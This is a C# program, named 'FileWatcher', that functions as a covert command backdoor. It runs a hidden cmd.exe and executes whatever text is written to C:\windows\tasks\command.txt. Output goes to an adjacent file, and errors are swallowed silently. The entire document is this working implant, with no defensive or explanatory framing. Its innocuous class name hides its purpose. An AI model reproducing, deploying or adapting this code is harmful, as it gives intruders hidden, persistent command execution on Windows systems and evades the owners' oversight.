using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Diagnostics;

public class FileWatcher
{
    static FileSystemWatcher watcher;
    static Process p;
    static string watcherDir = "C:\\windows\\tasks";
    static string watcherFilter = "command.txt";
    static string cmdFile = "C:\\windows\\tasks\\command.txt";
    static string outFile = "C:\\windows\\tasks\\output.txt";
    static private AutoResetEvent _outputWaitHandle;
    static string cmdOutput;



    public static void Main(string[] args)
    {

        createProcess();
        startWatcher();

        System.Threading.Thread.Sleep(Timeout.Infinite);


    }

    static private void createProcess()
    {
        try
        {
            _outputWaitHandle = new AutoResetEvent(false);
            p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;

            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            p.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);

            p.Start();
            p.BeginErrorReadLine();
            p.BeginOutputReadLine();
        }
        catch
        {
            System.Environment.Exit(1);
        }
    }

    static private void startWatcher()
    {
        try
        {
            watcher = new FileSystemWatcher();
            watcher.Path = watcherDir;
            watcher.NotifyFilter = NotifyFilters.Attributes |
            NotifyFilters.CreationTime |
            NotifyFilters.FileName |
            NotifyFilters.LastAccess |
            NotifyFilters.LastWrite |
            NotifyFilters.Security |
            NotifyFilters.Size;

            watcher.Filter = watcherFilter;
            watcher.Changed += new FileSystemEventHandler(OnChanged);
            watcher.EnableRaisingEvents = true;
        }
        catch (Exception ex)
        {
            p.Kill();
            System.Environment.Exit(1);
        }
    }

    static void execute(string cmd)
    {
        try
        {
            p.StandardInput.WriteLine(cmd);
        }
        catch
        {
            p.WaitForExit();
        }
    }

    public static string get_command(String file_name)
    {
        int attempts = 40;
        while (attempts != 0)
        {
            System.Threading.Thread.Sleep(100);
            try
            {
                string cmd = File.ReadAllText(file_name);
                return cmd;
            }
            catch
            {
                attempts--;
            }
        }
        return "";
    }

    // Define the event handlers. 
    public static void OnChanged(object source, FileSystemEventArgs e)
    {
        // Specify what is done when a file is changed.
        try
        {
            watcher.EnableRaisingEvents = false;
            string cmd;
            cmd = get_command(cmdFile);
            if (cmd != "")
            {
                execute(cmd);
            }
        }
        finally
        {
            watcher.EnableRaisingEvents = true;
        }
    }

    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs e)
    {
        int attempts = 60;
        int interval = 100;
        if (!String.IsNullOrEmpty(e.Data))
        {
            while (attempts > 0)
            {
                try
                {
                    using (StreamWriter sw = File.AppendText(outFile))
                    {
                        sw.WriteLine(e.Data, Encoding.UTF8);
                        break;
                    }
                }
                catch (Exception ex)
                {
                    attempts--;
                    interval += 5;
                    System.Threading.Thread.Sleep(interval);
                    if (attempts == 0)
                    {
                        System.Environment.Exit(1);
                    }
                }
            }
        }
    }
}